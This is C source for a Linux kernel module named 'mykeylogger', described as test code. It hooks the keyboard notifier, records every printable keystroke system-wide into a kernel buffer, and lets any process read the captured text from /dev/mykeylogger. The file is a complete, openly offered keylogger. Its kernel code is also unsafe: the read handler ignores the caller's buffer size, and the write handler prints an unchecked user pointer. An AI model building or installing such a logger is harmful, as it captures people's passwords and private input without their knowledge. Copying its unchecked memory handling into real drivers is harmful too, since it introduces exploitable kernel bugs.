#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

#define DEVICE_NAME "mykeylogger"
#define CLASS_NAME "MKL"

#define LOG_MAX 2048

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hiziri");
MODULE_DESCRIPTION("This Module is Test Code.");
MODULE_VERSION("0.1");

// mod info
static int majourNumber;
static struct class* mkl_class = NULL;
static struct device* mkl_dev = NULL;
static char *module_name = DEVICE_NAME;
module_param(module_name, charp, S_IRUGO);

// logger info
static char log[LOG_MAX] = {0};
static char *log_p = log;
static int log_size;

// mutex
static DEFINE_MUTEX(mkl_mutex);

// definition
static int dev_open(struct inode *, struct file *);
static int dev_release(struct inode *, struct file *);
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);

static int keys_pressed(struct notifier_block *, unsigned long, void *);

// set dev ops
static struct file_operations fops = {
  .open = dev_open,
  .read = dev_read,
  .write = dev_write,
  .release = dev_release,
};

// set notifier
static struct notifier_block nb = {
  .notifier_call = keys_pressed,
};

static int __init my_key_logger_init(void){
  printk(KERN_INFO "MKL: %s is Loaded!", module_name);

  // allocate majour num
  majourNumber = register_chrdev(0, DEVICE_NAME, &fops);
  if (majourNumber < 0) {
    printk(KERN_ALERT "%s: failed to register majour num.", CLASS_NAME);
    return majourNumber;
  }
  printk(KERN_INFO "%s: registered majour num", CLASS_NAME);
  
  // register dev class
  mkl_class = class_create(THIS_MODULE, CLASS_NAME);
  if (IS_ERR(mkl_class)) {
    unregister_chrdev(majourNumber, DEVICE_NAME);
    printk(KERN_ALERT "%s: failed to register dev class\n", CLASS_NAME);
    return PTR_ERR(mkl_class);
  }
  printk(KERN_INFO "%s: dev class registered", CLASS_NAME);

  // register dev driver
  mkl_dev = device_create(mkl_class, NULL, MKDEV(majourNumber, 0), NULL, DEVICE_NAME);
  if (IS_ERR(mkl_dev)) {
    class_destroy(mkl_class);
    unregister_chrdev(majourNumber, DEVICE_NAME);
    printk(KERN_ALERT "%s: failed to create device\n", CLASS_NAME);
    return PTR_ERR(mkl_dev);
  }
  printk(KERN_INFO "%s: device class created\n", CLASS_NAME);

  // register keyboard notifier
  register_keyboard_notifier(&nb);
  memset(log, 0, LOG_MAX);
  printk(KERN_INFO "%s: registered keyboard_notifier", CLASS_NAME);

  // mutex initialization
  mutex_init(&mkl_mutex);
  
  return 0;
}

static void __exit my_key_logger_exit(void){
  device_destroy(mkl_class, MKDEV(majourNumber, 0));
  class_unregister(mkl_class);
  class_destroy(mkl_class);
  unregister_chrdev(majourNumber, DEVICE_NAME);
  unregister_keyboard_notifier(&nb);
  
  printk(KERN_INFO "MKL: %s is Unloaded!\n", module_name);  
}

static int dev_open(struct inode *inode_p, struct file * file_p) {
  printk(KERN_INFO "%s: Open\n", CLASS_NAME);
  
  return 0;
}

static ssize_t dev_read(struct file *file_p, char *buffer, size_t length, loff_t *offset){
  int len = strlen(log);
  int error_count = copy_to_user(buffer, log, len);

  if (error_count == 0) {
    printk(KERN_INFO "%s: Send %d characters.\n", CLASS_NAME, len);
    memset(log, 0, LOG_MAX);
    log_p = log;
    
    return len;
  } else {
    printk(KERN_INFO "%s: Failed Sent\n", CLASS_NAME);
    return -EFAULT; // bad address msg (i.e. -14)
  }
}

static ssize_t dev_write(struct file *file_p, const char *buffer, size_t len, loff_t *offset) {
  printk(KERN_INFO "%s: Message is %s\n", CLASS_NAME, buffer);
  return len;
}

static int dev_release(struct inode *inode_p, struct file *file_p) {
  printk(KERN_INFO "%s: close\n", CLASS_NAME);
  return 0;
}

static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;

  if (action == KBD_KEYSYM && param->down) {
    char c = param->value;

    if (c == 0x01) {
      *(log_p++) = 0x0a;
      log_size++;
    } else if (c >= 0x20 && c < 0x7f) {
      *(log_p++) = c;
      log_size++;
    }

    if (log_size >= LOG_MAX) { // if overflow, reset logs
      log_size = 0;
      memset(log, 0, LOG_MAX); // init by 0
      log_p = log;
    }
  }
  
  return NOTIFY_OK; // everything ok
}

module_init(my_key_logger_init);
module_exit(my_key_logger_exit);
